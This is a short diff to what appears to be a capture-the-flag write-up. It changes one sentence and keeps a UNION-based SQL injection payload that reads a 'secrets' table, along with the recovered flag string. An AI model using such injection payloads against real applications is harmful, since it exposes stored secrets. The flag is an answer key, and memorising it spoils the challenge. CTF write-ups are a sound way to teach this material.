@@ -184,6 +184,6 @@ Let's craft a sql query that won't throw errors on sqlite3 or mysql and passes a
 
 `'OR 1=0 UNION SELECT * FROM secrets AS x WHERE x.key='flag`
 
-And I get the flag:
+Place that after /info and get yourself a nice flag.
 
 `(2, 'flag', 'bctf{7h1s_1s_prob4bly_the_easiest_web_s0_go_s0lve_smt_3ls3_n0w!!!}')`
